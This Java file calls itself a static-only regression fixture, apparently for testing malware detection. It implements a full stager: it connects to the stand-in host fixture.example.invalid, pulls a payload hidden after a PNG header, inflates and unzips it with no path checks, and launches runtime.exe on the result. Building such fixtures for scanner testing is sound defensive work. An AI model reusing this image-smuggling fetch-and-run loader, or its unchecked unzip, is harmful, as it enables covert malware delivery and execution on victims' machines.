package example;

import java.io.BufferedOutputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.zip.Inflater;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

/** Static-only regression fixture. Never execute or contact the example endpoint. */
public final class Fixture {
    private final Path root = Path.of("/tmp/concealed-fixture");

    public void run() throws Exception {
        stage();
        launch();
    }

    private void stage() throws Exception {
        Response response = Transport.get();
        byte[] archive = decode(response.body);
        unpack(archive);
    }

    private byte[] decode(byte[] image) throws Exception {
        byte[] magic = {(byte) 137, 80, 78, 71, 13, 10, 26, 10};
        for (int i = 0; i < magic.length; i++) {
            if (image[i] != magic[i]) {
                return null;
            }
        }
        if (image[8] != 104 || image[9] != 73 || image[10] != 100 || image[11] != 115) {
            return null;
        }
        byte[] compressed = Arrays.copyOfRange(image, 12, image.length);
        return inflate(compressed);
    }

    private byte[] inflate(byte[] compressed) throws Exception {
        Inflater inflater = new Inflater();
        inflater.setInput(compressed);
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];
        while (!inflater.finished()) {
            int count = inflater.inflate(buffer);
            output.write(buffer, 0, count);
        }
        inflater.end();
        return output.toByteArray();
    }

    private void unpack(byte[] archive) throws Exception {
        ByteArrayInputStream bytes = new ByteArrayInputStream(archive);
        ZipInputStream zip = new ZipInputStream(bytes);
        byte[] buffer = new byte[4096];
        ZipEntry entry;
        while ((entry = zip.getNextEntry()) != null) {
            Path target = root.resolve(entry.getName());
            FileOutputStream file = new FileOutputStream(target.toFile());
            BufferedOutputStream output = new BufferedOutputStream(file);
            int count;
            while ((count = zip.read(buffer)) > 0) {
                output.write(buffer, 0, count);
            }
            output.close();
            zip.closeEntry();
        }
        zip.close();
    }

    private void launch() throws Exception {
        Path executable = root.resolve("runtime.exe");
        List<String> command = new ArrayList<>();
        command.add(executable.toString());
        command.add(root.resolve("payload").toString());
        ProcessBuilder process = new ProcessBuilder(command);
        process.directory(root.resolve("payload").toFile());
        process.start();
    }
}

final class Response {
    final byte[] body;
    Response(byte[] body) { this.body = body; }
}

final class Transport {
    static Response get() throws Exception {
        Socket socket = new Socket();
        socket.connect(new InetSocketAddress("fixture.example.invalid", 80));
        byte[] bytes = socket.getInputStream().readAllBytes();
        return new Response(bytes);
    }
}
